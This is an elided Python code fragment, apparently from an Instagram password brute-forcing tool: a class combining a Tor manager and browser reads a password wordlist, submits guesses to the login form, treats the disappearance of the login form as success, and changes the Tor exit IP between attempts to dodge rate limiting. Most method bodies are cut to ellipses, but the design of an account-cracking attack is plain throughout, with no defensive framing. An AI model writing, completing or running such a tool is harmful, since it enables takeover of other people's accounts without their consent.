...
class Instagram(TorManager, Browser):
        ...
        with open(self.wordlist, 'r') as passwords:
            for pwd in passwords:
                ...
                if len(self.passlist) < 5:
                    ...
                    while self.alive and len(self.passlist):
                        pass
    ...
    def connectionHandler(self):
        ...
        while self.alive and self.wait:
            try:
                self.updateIp()
    ...
    def attempt(self, pwd):
        ...
        if html:
            if self.form1 not in html and self.form2 not in html:
                self.isFound = True
                self.kill(pwd)
    ...
    def run(self):
        ...
        while self.alive:
            ...
            if bot:
                while self.alive and bot.is_alive():
                    pass
                if self.alive:
                    self.changeIp()
